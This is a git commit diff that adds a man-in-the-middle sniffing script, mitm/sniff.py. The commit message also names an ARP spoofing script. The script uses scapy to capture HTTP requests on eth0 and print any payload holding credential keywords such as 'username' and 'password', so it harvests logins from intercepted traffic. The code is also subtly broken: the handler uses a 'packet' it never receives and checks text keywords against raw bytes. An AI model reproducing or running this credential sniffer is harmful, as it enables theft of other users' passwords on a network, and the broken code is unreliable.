5381694b384f258ca85db401f791ffcc4bfb296a
Carey McLelland <carey.mclelland@cbc.ca>
2021-01-18 14:25:23 -0500

    Adding mitm python scripts arp_spoof.py & sniff.py.

--- mitm/sniff.py
+++ mitm/sniff.py
@@ -6,6 +6,12 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 def process_sniffed_packet():
-    print(packet)
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["username", "user", "login", "password", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
 
 sniff("eth0")
